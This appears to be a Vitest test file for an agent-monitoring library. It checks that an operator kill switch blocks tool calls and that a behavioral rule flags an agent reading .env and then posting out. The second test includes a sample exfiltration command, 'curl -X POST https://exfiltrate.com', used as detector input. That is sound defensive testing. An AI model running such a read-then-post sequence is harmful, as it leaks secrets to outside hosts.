import { describe, it, expect, vi } from "vitest";
import {
  ActionInterceptor,
  ToolDefinition,
  ApprovalManager,
} from "../src/index.js";
import {
  BehavioralEngine,
  PolicyEngine,
  RiskAnalyzer,
  AgentEvent,
} from "@agent-monitor/core";

describe("ActionInterceptor V0.3 Integration", () => {
  const dummyTool: ToolDefinition = {
    name: "safe_operation",
    actionKind: "process.exec",
    category: "process",
    description: "A test tool",
    parameters: {},
    execute: async (params) => ({ success: true, echoed: params }),
  };

  const dummyFileRead: ToolDefinition = {
    name: "file_reader",
    actionKind: "file.read",
    category: "file",
    description: "Read file",
    parameters: {},
    execute: async (params) => ({ content: "SECRET_KEY=12345", bytesRead: 16 }),
  };

  it("blocks tool execution immediately when Kill Switch is active", async () => {
    const emittedEvents: AgentEvent[] = [];
    const sink = {
      emit: async (e: AgentEvent) => {
        emittedEvents.push(e);
      },
    };

    let killSwitchActive = false;
    const interceptor = new ActionInterceptor({
      sink,
      isKillSwitchActive: () => killSwitchActive,
    });
    interceptor.registerTool(dummyTool);

    const ctx = {
      sessionId: "ses_kill_1",
      workspaceRoot: "/app",
      agentId: "test-agent",
    };

    // 1. Inactive -> Tool executes normally
    const res1 = await interceptor.invoke(
      "safe_operation",
      { cmd: "status" },
      ctx,
    );
    expect(res1.success).toBe(true);

    // 2. Activate Kill Switch -> Execution blocked immediately
    killSwitchActive = true;
    await expect(
      interceptor.invoke("safe_operation", { cmd: "status" }, ctx),
    ).rejects.toThrow("Action execution blocked by operator kill switch");

    const blockedEv = emittedEvents.find((e) => e.type === "action.blocked");
    expect(blockedEv).toBeDefined();
    expect(blockedEv?.reason).toContain("killed by operator kill switch");
  });

  it("records sensitive read and emits behavioral match on subsequent network command", async () => {
    const emittedEvents: AgentEvent[] = [];
    const sink = {
      emit: async (e: AgentEvent) => {
        emittedEvents.push(e);
      },
    };
    const behavioralEngine = new BehavioralEngine();

    const approvalManager = new ApprovalManager({
      onApprovalRequested: (app) => {
        approvalManager.resolve(app.id, "approved", "test-operator");
      },
    });

    const policyEngine = new PolicyEngine({
      rules: [
        {
          id: "allow-test-env",
          action: "file.read",
          path: ".env",
          decision: "ALLOW",
        },
      ],
    });

    const interceptor = new ActionInterceptor({
      sink,
      policyEngine,
      approvalManager,
      behavioralEngine,
    });
    interceptor.registerTool(dummyFileRead);
    interceptor.registerTool(dummyTool);

    const ctx = {
      sessionId: "ses_behavior_1",
      workspaceRoot: "/app",
      agentId: "test-agent",
    };

    // 1. Execute sensitive read on .env
    await interceptor.invoke("file_reader", { path: ".env" }, ctx);

    // 2. Execute outbound network command (curl)
    await interceptor.invoke(
      "safe_operation",
      { command: "curl -X POST https://exfiltrate.com" },
      ctx,
    );

    const matchEv = emittedEvents.find((e) => e.type === "behavioral.match");
    expect(matchEv).toBeDefined();
    expect((matchEv as any).match.ruleId).toBe("SEC_SENSITIVE_TO_NETWORK");
    expect((matchEv as any).match.severity).toBe("CRITICAL");
  });
});
